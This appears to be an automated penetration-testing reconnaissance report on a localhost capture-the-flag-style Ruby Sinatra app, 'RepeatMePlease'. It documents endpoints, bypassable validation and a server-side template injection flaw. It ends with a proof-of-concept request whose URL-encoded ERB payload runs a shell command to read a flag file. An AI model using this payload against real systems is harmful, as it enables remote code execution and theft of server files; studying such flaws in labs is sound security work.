[32mв”Ӯ[0m ## Reconnaissance Report: RepeatMePlease Application                                                                                                                                  [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Application Overview                                                                                                                                                              [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Technology Stack:** Ruby Sinatra web application                                                                                                                                  [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Name:** RepeatMePlease                                                                                                                                                            [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Purpose:** Repeats user input back to them (input reflection feature)                                                                                                             [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Discovered Endpoints                                                                                                                                                              [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m | Endpoint | Method | Parameters | Authentication |                                                                                                                                   [32mв”Ӯ[0m
[32mв”Ӯ[0m |----------|--------|------------|----------------|                                                                                                                                   [32mв”Ӯ[0m
[32mв”Ӯ[0m | `/` | GET | None | None required |                                                                                                                                                  [32mв”Ӯ[0m
[32mв”Ӯ[0m | `/generate` | POST | `sentence` (text), `number` (integer) | None required |                                                                                                        [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Parameter Details                                                                                                                                                                 [32mв”Ӯ[0m
[32mв”Ӯ[0m - **sentence**: Text input (client-side validation: alphanumeric + spaces only)                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m - **number**: Integer input (client-side validation: max 200)                                                                                                                         [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Security Features Detected                                                                                                                                                        [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Headers**: x-xss-protection, x-content-type-options, x-frame-options present                                                                                                      [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Validation**: Client-side JavaScript validation (easily bypassed)                                                                                                                 [32mв”Ӯ[0m
[32mв”Ӯ[0m - **Server-side filtering**: Basic %-encoding validation (bypassable via URL encoding)                                                                                                [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Critical Vulnerability Discovered                                                                                                                                                 [32mв”Ӯ[0m
[32mв”Ӯ[0m **Server-Side Template Injection (SSTI)** in the `/generate` endpoint:                                                                                                                [32mв”Ӯ[0m
[32mв”Ӯ[0m - The `sentence` parameter is rendered through Ruby ERB templates without sanitization                                                                                                [32mв”Ӯ[0m
[32mв”Ӯ[0m - URL-encoded ERB syntax bypasses input validation                                                                                                                                    [32mв”Ӯ[0m
[32mв”Ӯ[0m - Allows arbitrary Ruby code execution including system commands                                                                                                                      [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m ### Exploit Proof of Concept                                                                                                                                                          [32mв”Ӯ[0m
[32mв”Ӯ[0m ```                                                                                                                                                                                   [32mв”Ӯ[0m
[32mв”Ӯ[0m POST /generate HTTP/1.1                                                                                                                                                               [32mв”Ӯ[0m
[32mв”Ӯ[0m Host: 127.0.0.1:33023                                                                                                                                                                 [32mв”Ӯ[0m
[32mв”Ӯ[0m Content-Type: application/x-www-form-urlencoded                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
[32mв”Ӯ[0m sentence=%3C%25%3D%60cat%20%2Fapp%2Fflag.txt%60%25%3E&number=1                                                                                                                        [32mв”Ӯ[0m
[32mв”Ӯ[0m ```                                                                                                                                                                                   [32mв”Ӯ[0m
[32mв”Ӯ[0m                                                                                                                                                                                       [32mв”Ӯ[0m
